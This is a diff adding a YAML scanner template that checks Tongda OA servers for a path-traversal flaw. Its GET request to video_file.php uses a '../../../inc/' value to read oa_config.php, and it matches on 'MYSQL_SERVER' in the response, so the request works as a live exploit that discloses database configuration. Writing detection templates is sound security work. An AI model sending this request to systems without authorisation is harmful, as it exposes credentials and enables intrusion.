@@ -1,0 +1,26 @@
+id: TDXK-tongda-OA
+
+info:
+  name: TDXK-tongda-OA
+  author: Momika233
+  severity: high
+  reference:
+    - https://github.com/momika233
+  tags: tongdaOA
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php'
+
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "MYSQL_SERVER.*"
+        part: body
+
+      - type: status
+        status:
+          - 200
